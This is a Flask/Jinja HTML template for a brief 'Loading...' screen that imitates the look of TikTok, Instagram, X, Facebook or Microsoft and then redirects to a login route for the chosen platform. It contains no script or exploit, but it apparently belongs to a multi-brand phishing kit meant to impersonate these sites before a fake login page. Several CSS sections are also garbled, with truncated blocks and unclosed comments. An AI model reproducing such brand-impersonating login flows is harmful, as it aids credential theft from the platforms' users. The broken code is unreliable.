<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>{{ platform.capitalize() }} Loading... </title>
    <meta http-equiv="refresh" content="2; url={{ url_for('login', platform=platform) }}">
    <style>
        /* Base Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            transition: all 0.3s ease;
            background-color: #f1f1f1; /* Default background */
        }

        /* Loading Container */
        .login-container {
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            background: white;
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2.loading-text {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #333;
        }

        /* Spinner */
        .loader {
            border: 8px solid #f3f3f3; /* Light gray */
            border-top: 8px solid #3498db; /* Default Blue */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            50% { transform: rotate(50deg); }
            100% { transform: rotate(360deg); }
        }

        /* ------------------------------------- 
           üï∫ TikTok Style 
        -------------------------------------- */
        body.tiktok {
            background-color: #000;
            color: #fff;
            font-family: 'Arial Black', Gadget, sans-serif;
        }

        body.tiktok .login-container {
            background-color: #121212;
            color: white;
            box-shadow: 0 12px 50px rgba(0, 0, 0, 0.4);
        }

        body.tiktok .loader {
            border-top: 8px solid #fe2c55; /* TikTok pink */
        }

        /* ------------------------------------- 
           üì∏ Instagram Style 
        -------------------------------------- */
        body.instagram {
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body.instagram .login-container {
            background-color: rgba(255, 255, 255, 0.95);
            color: #262626;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
        }

        body.instagram .loader {
            border-top: 8px solid #d6249f; /* Instagram pink */
        }

        /* ------------------------------------- 
           üê¶ X.com (Twitter) Style

            box-shadow: 0 12px 50px rgba(0, 0, 0, 0.4);
        }

        }

        /* -------------------------------------

        /* ------------------------------------- 
           üë§ Facebook Style

            background-color: #1877f2;

        }

        body.microsoft .login-container {

        }
    </style>
</head>
<body class="{{ platform }}"> <!-- Platform-specific class applied to body -->

    <!-- Loading Container -->
    <div class="login-container">
        <h2 class="loading-text">Loading {{ platform.capitalize() }}...</h2>
        <!-- Spinner (or loader) -->
        <div class="loader"></div>
    </div>

</body>
</html>
<!-- This HTML template is designed to provide a loading screen for different platforms. 
     The platform name is passed as a variable and used to apply specific styles and animations. 
     The page will redirect to the login page after 2 seconds. -->
